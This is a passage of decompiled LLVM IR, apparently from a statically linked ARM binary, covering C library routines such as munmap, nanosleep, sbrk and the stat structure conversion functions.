  %v3_17018 = load i32, i32* @r4, align 4
  store i32 %v3_17018, i32* %stack_var_-12, align 4
  %v0_17028 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17028, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17028, -4095
  br i1 %tmp, label %dec_label_pc_17050, label %dec_label_pc_17038

dec_label_pc_17038:                               ; preds = %entry
  %v0_1703c = call i32 @__aeabi_read_tp()
  %v3_17040 = load i16, i16* @global_var_2447c.761, align 2
  %v4_17040 = sext i16 %v3_17040 to i32
  %v0_17044 = load i32, i32* %r2.global-to-local, align 4
  %v1_17044 = sub i32 0, %v0_17044
  store i32 %v1_17044, i32* %r2.global-to-local, align 4
  %v3_17048 = add i32 %v4_17040, %v0_1703c
  %v4_17048 = inttoptr i32 %v3_17048 to i32*
  store i32 %v1_17044, i32* %v4_17048, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17050.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17050

dec_label_pc_17050:                               ; preds = %entry, %dec_label_pc_17038
  %v1_17054 = phi i32 [ %v0_17028, %entry ], [ -1, %dec_label_pc_17038 ]
  %v2_17050 = phi i32 [ %v3_17018, %entry ], [ %v2_17050.pre, %dec_label_pc_17038 ]
  store i32 %v2_17050, i32* @r4, align 4
  ret i32 %v1_17054

; uselistorder directives
  uselistorder i32 %v0_17028, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17050, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1705c = load i32, i32* @r7, align 4
  store i32 %v3_1705c, i32* %stack_var_-8, align 4
  %v0_17068 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17068, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17068, -4095
  br i1 %tmp, label %dec_label_pc_17090, label %dec_label_pc_17078

dec_label_pc_17078:                               ; preds = %entry
  %v0_1707c = call i32 @__aeabi_read_tp()
  %v3_17080 = load i16, i16* @global_var_2447c.761, align 2
  %v4_17080 = sext i16 %v3_17080 to i32
  %v0_17084 = load i32, i32* %r2.global-to-local, align 4
  %v1_17084 = sub i32 0, %v0_17084
  store i32 %v1_17084, i32* %r2.global-to-local, align 4
  %v3_17088 = add i32 %v4_17080, %v0_1707c
  %v4_17088 = inttoptr i32 %v3_17088 to i32*
  store i32 %v1_17084, i32* %v4_17088, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17090.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17090

dec_label_pc_17090:                               ; preds = %entry, %dec_label_pc_17078
  %v1_17094 = phi i32 [ %v0_17068, %entry ], [ -1, %dec_label_pc_17078 ]
  %v2_17090 = phi i32 [ %v3_1705c, %entry ], [ %v2_17090.pre, %dec_label_pc_17078 ]
  store i32 %v2_17090, i32* @r7, align 4
  ret i32 %v1_17094

; uselistorder directives
  uselistorder i32 %v0_17068, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17090, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1709c = load i32, i32* @r7, align 4
  store i32 %v3_1709c, i32* %stack_var_-8, align 4
  %v0_170a8 = load i32, i32* @r0, align 4
  store i32 %v0_170a8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_170a8, -4095
  br i1 %tmp, label %dec_label_pc_170d0, label %dec_label_pc_170b8

dec_label_pc_170b8:                               ; preds = %entry
  %v0_170bc = call i32 @__aeabi_read_tp()
  %v3_170c0 = load i16, i16* @global_var_2447c.761, align 2
  %v4_170c0 = sext i16 %v3_170c0 to i32
  %v0_170c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_170c4 = sub i32 0, %v0_170c4
  store i32 %v1_170c4, i32* %r2.global-to-local, align 4
  %v3_170c8 = add i32 %v4_170c0, %v0_170bc
  %v4_170c8 = inttoptr i32 %v3_170c8 to i32*
  store i32 %v1_170c4, i32* %v4_170c8, align 4
  %v2_170d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_170d0

dec_label_pc_170d0:                               ; preds = %entry, %dec_label_pc_170b8
  %v1_170d4 = phi i32 [ %v0_170a8, %entry ], [ -1, %dec_label_pc_170b8 ]
  %v2_170d0 = phi i32 [ %v3_1709c, %entry ], [ %v2_170d0.pre, %dec_label_pc_170b8 ]
  store i32 %v2_170d0, i32* @r7, align 4
  ret i32 %v1_170d4

; uselistorder directives
  uselistorder i32 %v0_170a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_170d0, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_170e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 13000) to i32*), align 4
  %v2_170ec = icmp eq i32 %v4_170e8, 0
  %v3_170f0 = load i32, i32* @r4, align 4
  %v9_170f0 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_170ec, label %dec_label_pc_17100, label %entry.dec_label_pc_17108_crit_edge

entry.dec_label_pc_17108_crit_edge:               ; preds = %entry
  br label %dec_label_pc_17108

dec_label_pc_17100:                               ; preds = %entry
  store i32 %v3_170f0, i32* @r4, align 4
  store i32 %v9_170f0, i32* @r6, align 4
  %v0_17104 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_17108

dec_label_pc_17108:                               ; preds = %entry.dec_label_pc_17108_crit_edge, %dec_label_pc_17100
  %v0_17108 = call i32 @__libc_enable_asynccancel()
  %v0_1710c = load i32, i32* @r6, align 4
  store i32 %v0_1710c, i32* @r1, align 4
  store i32 %v0_17108, i32* @r5, align 4
  %v0_17114 = load i32, i32* @r4, align 4
  store i32 %v0_17114, i32* @r0, align 4
  %v0_17118 = call i32 @__syscall_nanosleep()
  store i32 %v0_17118, i32* @r4, align 4
  %v0_17120 = load i32, i32* @r5, align 4
  %v1_17124 = call i32 @__libc_disable_asynccancel(i32 %v0_17120)
  %v0_17128 = load i32, i32* @r4, align 4
  ret i32 %v0_17128

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 7, 10, 13, 1, 6, 8, 5, 9, 4, 3, 12, 2, 11, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 7, 10, 13, 1, 6, 8, 5, 9, 4, 3, 12, 2, 11, 0 }
  uselistorder label %dec_label_pc_17108, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1713c = load i32, i32* @r4, align 4
  store i32 %v3_1713c, i32* %stack_var_-16, align 4
  store i32 11580, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r4.global-to-local, align 4
  %v4_1714c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 11580) to i32*), align 4
  %v2_17150 = icmp eq i32 %v4_1714c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_17150, label %dec_label_pc_1715c, label %dec_label_pc_1716c

dec_label_pc_1715c:                               ; preds = %entry
  %v1_17160 = call i32 @__GI_brk(i32 0)
  %v1_17164 = icmp slt i32 %v1_17160, 0
  br i1 %v1_17164, label %dec_label_pc_17190, label %dec_label_pc_1716cthread-pre-split

dec_label_pc_1716cthread-pre-split:               ; preds = %dec_label_pc_1715c
  %v0_17170.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_1716c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1716c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1716c

dec_label_pc_1716c:                               ; preds = %dec_label_pc_1716cthread-pre-split, %entry
  %v1_1716c = phi i32 [ %v1_1716c.pre, %dec_label_pc_1716cthread-pre-split ], [ 11580, %entry ]
  %v0_1716c = phi i32 [ %v0_1716c.pre, %dec_label_pc_1716cthread-pre-split ], [ ptrtoint (i32* @global_var_24424.765 to i32), %entry ]
  %v1_17180 = phi i32 [ %v0_17170.pr, %dec_label_pc_1716cthread-pre-split ], [ %arg1, %entry ]
  %v2_1716c = add i32 %v0_1716c, %v1_1716c
  %v3_1716c = inttoptr i32 %v2_1716c to i32*
  %v4_1716c = load i32, i32* %v3_1716c, align 4
  %v2_17170 = icmp eq i32 %v1_17180, 0
  store i32 %v4_1716c, i32* %r4.global-to-local, align 4
  br i1 %v2_17170, label %dec_label_pc_17194, label %dec_label_pc_1717c

dec_label_pc_1717c:                               ; preds = %dec_label_pc_1716c
  %v2_17180 = add i32 %v4_1716c, %v1_17180
  %v1_17184 = call i32 @__GI_brk(i32 %v2_17180)
  %v1_17188 = icmp slt i32 %v1_17184, 0
  br i1 %v1_17188, label %dec_label_pc_17190, label %dec_label_pc_1717c.dec_label_pc_17194_crit_edge

dec_label_pc_1717c.dec_label_pc_17194_crit_edge:  ; preds = %dec_label_pc_1717c
  %v0_17194.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17194

dec_label_pc_17190:                               ; preds = %dec_label_pc_1717c, %dec_label_pc_1715c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17194

dec_label_pc_17194:                               ; preds = %dec_label_pc_1716c, %dec_label_pc_1717c.dec_label_pc_17194_crit_edge, %dec_label_pc_17190
  %v0_17194 = phi i32 [ %v0_17194.pre, %dec_label_pc_1717c.dec_label_pc_17194_crit_edge ], [ -1, %dec_label_pc_17190 ], [ %v4_1716c, %dec_label_pc_1716c ]
  %v2_17198 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17198, i32* @r4, align 4
  ret i32 %v0_17194

; uselistorder directives
  uselistorder i32 %v4_1716c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_17194, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_171b8 = load i32, i32* @r0, align 4
  ret i32 %v1_171b8
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_171bc = load i32, i32* @r4, align 4
  store i32 %v3_171bc, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_171d4 = inttoptr i32 %arg2 to i8*
  %v4_171d4 = call i32 @__GI_memset(i8* %v3_171d4, i32 0, i32 104)
  %v2_171d8 = load i32, i32* %arg1, align 4
  store i32 %v2_171d8, i32* %r3.global-to-local, align 4
  %v3_171d8 = add i32 %tmp, 4
  %v4_171d8 = inttoptr i32 %v3_171d8 to i32*
  %v5_171d8 = load i32, i32* %v4_171d8, align 4
  store i32 %v5_171d8, i32* %r4.global-to-local, align 4
  %v0_171dc = load i32, i32* %r5.global-to-local, align 4
  %v1_171dc = inttoptr i32 %v0_171dc to i32*
  store i32 %v2_171d8, i32* %v1_171dc, align 4
  %v3_171dc = add i32 %v0_171dc, 4
  %v4_171dc = inttoptr i32 %v3_171dc to i32*
  %v5_171dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_171dc, i32* %v4_171dc, align 4
  %v0_171e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_171e0 = add i32 %v0_171e0, 12
  %v2_171e0 = inttoptr i32 %v1_171e0 to i32*
  %v3_171e0 = load i32, i32* %v2_171e0, align 4
  %v1_171e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_171e4 = add i32 %v1_171e4, 12
  %v3_171e4 = inttoptr i32 %v2_171e4 to i32*
  store i32 %v3_171e0, i32* %v3_171e4, align 4
  %v0_171e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_171e8 = add i32 %v0_171e8, 96
  store i32 %v1_171e8, i32* %r3.global-to-local, align 4
  %v1_171ec = inttoptr i32 %v1_171e8 to i32*
  %v2_171ec = load i32, i32* %v1_171ec, align 4
  store i32 %v2_171ec, i32* %r3.global-to-local, align 4
  %v3_171ec = add i32 %v0_171e8, 100
  %v4_171ec = inttoptr i32 %v3_171ec to i32*
  %v5_171ec = load i32, i32* %v4_171ec, align 4
  store i32 %v5_171ec, i32* %r4.global-to-local, align 4
  %v1_171f0 = add i32 %v0_171e8, 56
  %v2_171f0 = inttoptr i32 %v1_171f0 to i32*
  %v3_171f0 = load i32, i32* %v2_171f0, align 4
  store i32 %v3_171f0, i32* %r2.global-to-local, align 4
  %v1_171f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_171f4 = add i32 %v1_171f4, 96
  %v3_171f4 = inttoptr i32 %v2_171f4 to i32*
  store i32 %v2_171ec, i32* %v3_171f4, align 4
  %v0_171f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_171f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_171f8 = add i32 %v1_171f8, 100
  %v3_171f8 = inttoptr i32 %v2_171f8 to i32*
  store i32 %v0_171f8, i32* %v3_171f8, align 4
  %v0_171fc = load i32, i32* %r6.global-to-local, align 4
  %v1_171fc = add i32 %v0_171fc, 24
  store i32 %v1_171fc, i32* %ip.global-to-local, align 4
  %v1_17200 = inttoptr i32 %v1_171fc to i32*
  %v2_17200 = load i32, i32* %v1_17200, align 4
  store i32 %v2_17200, i32* %ip.global-to-local, align 4
  %v3_17200 = add i32 %v0_171fc, 28
  %v4_17200 = inttoptr i32 %v3_17200 to i32*
  %v5_17200 = load i32, i32* %v4_17200, align 4
  store i32 %v5_17200, i32* %lr.global-to-local, align 4
  %v0_17204 = load i32, i32* %r2.global-to-local, align 4
  %v1_17204 = load i32, i32* %r5.global-to-local, align 4
  %v2_17204 = add i32 %v1_17204, 56
  %v3_17204 = inttoptr i32 %v2_17204 to i32*
  store i32 %v0_17204, i32* %v3_17204, align 4
  %v0_17208 = load i32, i32* %r6.global-to-local, align 4
  %v1_17208 = add i32 %v0_17208, 72
  store i32 %v1_17208, i32* %r3.global-to-local, align 4
  %v1_1720c = add i32 %v0_17208, 32
  store i32 %v1_1720c, i32* %r7.global-to-local, align 4
  %v1_17210 = inttoptr i32 %v1_1720c to i32*
  %v2_17210 = load i32, i32* %v1_17210, align 4
  store i32 %v2_17210, i32* %r7.global-to-local, align 4
  %v3_17210 = add i32 %v0_17208, 36
  %v4_17210 = inttoptr i32 %v3_17210 to i32*
  %v5_17210 = load i32, i32* %v4_17210, align 4
  store i32 %v5_17210, i32* %r8.global-to-local, align 4
  %v1_17214 = inttoptr i32 %v1_17208 to i32*
  %v2_17214 = load i32, i32* %v1_17214, align 4
  %v3_17214 = add i32 %v0_17208, 76
  %v4_17214 = inttoptr i32 %v3_17214 to i32*
  %v5_17214 = load i32, i32* %v4_17214, align 4
  store i32 %v5_17214, i32* %r1.global-to-local, align 4
  %v0_17218 = load i32, i32* %r5.global-to-local, align 4
  %v1_17218 = add i32 %v0_17218, 72
  %v1_1721c = inttoptr i32 %v1_17218 to i32*
  store i32 %v2_17214, i32* %v1_1721c, align 4
  %v3_1721c = add i32 %v0_17218, 76
  %v4_1721c = inttoptr i32 %v3_1721c to i32*
  %v5_1721c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1721c, i32* %v4_1721c, align 4
  %v0_17220 = load i32, i32* %r7.global-to-local, align 4
  %v1_17220 = load i32, i32* %r5.global-to-local, align 4
  %v2_17220 = add i32 %v1_17220, 32
  %v3_17220 = inttoptr i32 %v2_17220 to i32*
  store i32 %v0_17220, i32* %v3_17220, align 4
  %v0_17224 = load i32, i32* %r8.global-to-local, align 4
  %v1_17224 = load i32, i32* %r5.global-to-local, align 4
  %v2_17224 = add i32 %v1_17224, 36
  %v3_17224 = inttoptr i32 %v2_17224 to i32*
  store i32 %v0_17224, i32* %v3_17224, align 4
  %v0_17228 = load i32, i32* %r6.global-to-local, align 4
  %v1_17228 = add i32 %v0_17228, 80
  store i32 %v1_17228, i32* %r3.global-to-local, align 4
  %v1_1722c = add i32 %v0_17228, 48
  store i32 %v1_1722c, i32* %r7.global-to-local, align 4
  %v1_17230 = inttoptr i32 %v1_1722c to i32*
  %v2_17230 = load i32, i32* %v1_17230, align 4
  store i32 %v2_17230, i32* %r7.global-to-local, align 4
  %v3_17230 = add i32 %v0_17228, 52
  %v4_17230 = inttoptr i32 %v3_17230 to i32*
  %v5_17230 = load i32, i32* %v4_17230, align 4
  store i32 %v5_17230, i32* %r8.global-to-local, align 4
  %v1_17234 = inttoptr i32 %v1_17228 to i32*
  %v2_17234 = load i32, i32* %v1_17234, align 4
  %v3_17234 = add i32 %v0_17228, 84
  %v4_17234 = inttoptr i32 %v3_17234 to i32*
  %v5_17234 = load i32, i32* %v4_17234, align 4
  store i32 %v5_17234, i32* %r1.global-to-local, align 4
  %v1_17238 = add i32 %v0_17228, 16
  %v2_17238 = inttoptr i32 %v1_17238 to i32*
  %v3_17238 = load i32, i32* %v2_17238, align 4
  store i32 %v3_17238, i32* %r2.global-to-local, align 4
  %v0_1723c = load i32, i32* %r5.global-to-local, align 4
  %v1_1723c = add i32 %v0_1723c, 80
  %v1_17240 = inttoptr i32 %v1_1723c to i32*
  store i32 %v2_17234, i32* %v1_17240, align 4
  %v3_17240 = add i32 %v0_1723c, 84
  %v4_17240 = inttoptr i32 %v3_17240 to i32*
  %v5_17240 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17240, i32* %v4_17240, align 4
  %v0_17244 = load i32, i32* %r7.global-to-local, align 4
  %v1_17244 = load i32, i32* %r5.global-to-local, align 4
  %v2_17244 = add i32 %v1_17244, 48
  %v3_17244 = inttoptr i32 %v2_17244 to i32*
  store i32 %v0_17244, i32* %v3_17244, align 4
  %v0_17248 = load i32, i32* %r8.global-to-local, align 4
  %v1_17248 = load i32, i32* %r5.global-to-local, align 4
  %v2_17248 = add i32 %v1_17248, 52
  %v3_17248 = inttoptr i32 %v2_17248 to i32*
  store i32 %v0_17248, i32* %v3_17248, align 4
  %v0_1724c = load i32, i32* %r2.global-to-local, align 4
  %v1_1724c = load i32, i32* %r5.global-to-local, align 4
  %v2_1724c = add i32 %v1_1724c, 16
  %v3_1724c = inttoptr i32 %v2_1724c to i32*
  store i32 %v0_1724c, i32* %v3_1724c, align 4
  %v0_17250 = load i32, i32* %r6.global-to-local, align 4
  %v1_17250 = add i32 %v0_17250, 88
  store i32 %v1_17250, i32* %r3.global-to-local, align 4
  %v1_17254 = add i32 %v0_17250, 20
  %v2_17254 = inttoptr i32 %v1_17254 to i32*
  %v3_17254 = load i32, i32* %v2_17254, align 4
  store i32 %v3_17254, i32* %r2.global-to-local, align 4
  %v1_17258 = inttoptr i32 %v1_17250 to i32*
  %v2_17258 = load i32, i32* %v1_17258, align 4
  %v3_17258 = add i32 %v0_17250, 92
  %v4_17258 = inttoptr i32 %v3_17258 to i32*
  %v5_17258 = load i32, i32* %v4_17258, align 4
  store i32 %v5_17258, i32* %r1.global-to-local, align 4
  %v1_1725c = add i32 %v0_17250, 64
  store i32 %v1_1725c, i32* %r6.global-to-local, align 4
  %v1_17260 = inttoptr i32 %v1_1725c to i32*
  %v2_17260 = load i32, i32* %v1_17260, align 4
  store i32 %v2_17260, i32* %r6.global-to-local, align 4
  %v3_17260 = add i32 %v0_17250, 68
  %v4_17260 = inttoptr i32 %v3_17260 to i32*
  %v5_17260 = load i32, i32* %v4_17260, align 4
  store i32 %v5_17260, i32* %r7.global-to-local, align 4
  %v0_17264 = load i32, i32* %r5.global-to-local, align 4
  %v1_17264 = add i32 %v0_17264, 88
  store i32 %v1_17264, i32* %r3.global-to-local, align 4
  %v2_17268 = add i32 %v0_17264, 20
  %v3_17268 = inttoptr i32 %v2_17268 to i32*
  store i32 %v3_17254, i32* %v3_17268, align 4
  %v0_1726c = load i32, i32* %ip.global-to-local, align 4
  %v1_1726c = load i32, i32* %r5.global-to-local, align 4
  %v2_1726c = add i32 %v1_1726c, 24
  %v3_1726c = inttoptr i32 %v2_1726c to i32*
  store i32 %v0_1726c, i32* %v3_1726c, align 4
  %v0_17270 = load i32, i32* %lr.global-to-local, align 4
  %v1_17270 = load i32, i32* %r5.global-to-local, align 4
  %v2_17270 = add i32 %v1_17270, 28
  %v3_17270 = inttoptr i32 %v2_17270 to i32*
  store i32 %v0_17270, i32* %v3_17270, align 4
  %v0_17274 = load i32, i32* %r6.global-to-local, align 4
  %v1_17274 = load i32, i32* %r5.global-to-local, align 4
  %v2_17274 = add i32 %v1_17274, 64
  %v3_17274 = inttoptr i32 %v2_17274 to i32*
  store i32 %v0_17274, i32* %v3_17274, align 4
  %v0_17278 = load i32, i32* %r7.global-to-local, align 4
  %v1_17278 = load i32, i32* %r5.global-to-local, align 4
  %v2_17278 = add i32 %v1_17278, 68
  %v3_17278 = inttoptr i32 %v2_17278 to i32*
  store i32 %v0_17278, i32* %v3_17278, align 4
  %v0_1727c = load i32, i32* %r3.global-to-local, align 4
  %v1_1727c = inttoptr i32 %v0_1727c to i32*
  store i32 %v2_17258, i32* %v1_1727c, align 4
  %v3_1727c = add i32 %v0_1727c, 4
  %v4_1727c = inttoptr i32 %v3_1727c to i32*
  %v5_1727c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1727c, i32* %v4_1727c, align 4
  %v2_17280 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17280, i32* %r4.global-to-local, align 4
  ret i32 %v2_17258

; uselistorder directives
  uselistorder i32 %v0_17250, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_17228, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_17288 = load i32, i32* @r4, align 4
  store i32 %v3_17288, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_172a0 = inttoptr i32 %arg2 to i8*
  %v4_172a0 = call i32 @__GI_memset(i8* %v3_172a0, i32 0, i32 88)
  %v2_172a4 = load i32, i32* %arg1, align 4
  %v3_172a4 = add i32 %tmp, 4
  %v4_172a4 = inttoptr i32 %v3_172a4 to i32*
  %v5_172a4 = load i32, i32* %v4_172a4, align 4
  store i32 %v5_172a4, i32* %r4.global-to-local, align 4
  %v0_172a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_172a8 = inttoptr i32 %v0_172a8 to i32*
  store i32 %v2_172a4, i32* %v1_172a8, align 4
  %v3_172a8 = add i32 %v0_172a8, 4
  %v4_172a8 = inttoptr i32 %v3_172a8 to i32*
  %v5_172a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_172a8, i32* %v4_172a8, align 4
  %v0_172ac = load i32, i32* %r5.global-to-local, align 4
  %v1_172ac = add i32 %v0_172ac, 32
  %v1_172b0 = inttoptr i32 %v1_172ac to i32*
  %v2_172b0 = load i32, i32* %v1_172b0, align 4
  %v3_172b0 = add i32 %v0_172ac, 36
  %v4_172b0 = inttoptr i32 %v3_172b0 to i32*
  %v5_172b0 = load i32, i32* %v4_172b0, align 4
  store i32 %v5_172b0, i32* %r4.global-to-local, align 4
  %v1_172b4 = add i32 %v0_172ac, 96
  %v2_172b4 = inttoptr i32 %v1_172b4 to i32*
  %v3_172b4 = load i32, i32* %v2_172b4, align 4
  store i32 %v3_172b4, i32* %r2.global-to-local, align 4
  %v1_172b8 = load i32, i32* %r6.global-to-local, align 4
  %v2_172b8 = add i32 %v1_172b8, 32
  %v3_172b8 = inttoptr i32 %v2_172b8 to i32*
  store i32 %v2_172b0, i32* %v3_172b8, align 4
  %v0_172bc = load i32, i32* %r4.global-to-local, align 4
  %v1_172bc = load i32, i32* %r6.global-to-local, align 4
  %v2_172bc = add i32 %v1_172bc, 36
  %v3_172bc = inttoptr i32 %v2_172bc to i32*
  store i32 %v0_172bc, i32* %v3_172bc, align 4
  %v0_172c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_172c0 = load i32, i32* %r6.global-to-local, align 4
  %v2_172c0 = add i32 %v1_172c0, 12
  %v3_172c0 = inttoptr i32 %v2_172c0 to i32*
  store i32 %v0_172c0, i32* %v3_172c0, align 4
  %v0_172c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_172c4 = add i32 %v0_172c4, 48
  %v2_172c4 = inttoptr i32 %v1_172c4 to i32*
  %v3_172c4 = load i32, i32* %v2_172c4, align 4
  %v1_172c8 = add i32 %v0_172c4, 24
  store i32 %v1_172c8, i32* %ip.global-to-local, align 4
  %v1_172cc = inttoptr i32 %v1_172c8 to i32*
  %v2_172cc = load i32, i32* %v1_172cc, align 4
  store i32 %v2_172cc, i32* %ip.global-to-local, align 4
  %v3_172cc = add i32 %v0_172c4, 28
  %v4_172cc = inttoptr i32 %v3_172cc to i32*
  %v5_172cc = load i32, i32* %v4_172cc, align 4
  store i32 %v5_172cc, i32* %lr.global-to-local, align 4
  %v1_172d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_172d0 = add i32 %v1_172d0, 44
  %v3_172d0 = inttoptr i32 %v2_172d0 to i32*
  store i32 %v3_172c4, i32* %v3_172d0, align 4
  %v0_172d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_172d4 = add i32 %v0_172d4, 64
  %v2_172d4 = inttoptr i32 %v1_172d4 to i32*
  %v3_172d4 = load i32, i32* %v2_172d4, align 4
  %v1_172d8 = add i32 %v0_172d4, 56
  %v2_172d8 = inttoptr i32 %v1_172d8 to i32*
  %v3_172d8 = load i32, i32* %v2_172d8, align 4
  store i32 %v3_172d8, i32* %r2.global-to-local, align 4
  %v1_172dc = load i32, i32* %r6.global-to-local, align 4
  %v2_172dc = add i32 %v1_172dc, 52
  %v3_172dc = inttoptr i32 %v2_172dc to i32*
  store i32 %v3_172d4, i32* %v3_172dc, align 4
  %v0_172e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_172e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_172e0 = add i32 %v1_172e0, 48
  %v3_172e0 = inttoptr i32 %v2_172e0 to i32*
  store i32 %v0_172e0, i32* %v3_172e0, align 4
  %v0_172e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_172e4 = add i32 %v0_172e4, 72
  %v1_172e8 = inttoptr i32 %v1_172e4 to i32*
  %v2_172e8 = load i32, i32* %v1_172e8, align 4
  %v3_172e8 = add i32 %v0_172e4, 76
  %v4_172e8 = inttoptr i32 %v3_172e8 to i32*
  %v5_172e8 = load i32, i32* %v4_172e8, align 4
  store i32 %v5_172e8, i32* %r1.global-to-local, align 4
  %v0_172ec = load i32, i32* %r6.global-to-local, align 4
  %v1_172ec = add i32 %v0_172ec, 56
  %v1_172f0 = inttoptr i32 %v1_172ec to i32*
  store i32 %v2_172e8, i32* %v1_172f0, align 4
  %v3_172f0 = add i32 %v0_172ec, 60
  %v4_172f0 = inttoptr i32 %v3_172f0 to i32*
  %v5_172f0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_172f0, i32* %v4_172f0, align 4
  %v0_172f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_172f4 = add i32 %v0_172f4, 80
  %v1_172f8 = inttoptr i32 %v1_172f4 to i32*
  %v2_172f8 = load i32, i32* %v1_172f8, align 4
  %v3_172f8 = add i32 %v0_172f4, 84
  %v4_172f8 = inttoptr i32 %v3_172f8 to i32*
  %v5_172f8 = load i32, i32* %v4_172f8, align 4
  store i32 %v5_172f8, i32* %r1.global-to-local, align 4
  %v0_172fc = load i32, i32* %r6.global-to-local, align 4
